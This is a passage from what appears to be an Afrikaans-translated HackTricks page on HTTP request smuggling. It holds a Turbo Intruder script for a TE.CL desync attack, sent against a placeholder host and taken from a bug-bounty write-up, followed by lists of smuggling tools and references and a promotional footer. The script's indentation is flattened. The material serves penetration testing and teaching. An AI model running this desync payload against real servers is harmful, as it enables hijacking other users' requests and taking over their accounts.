def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Van: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Gereedskap

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Hierdie gereedskap is 'n grammatika-gebaseerde HTTP Fuzzer wat nuttig is om vreemde versoeksmokkel-afwykings te vind.

## Verwysings

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
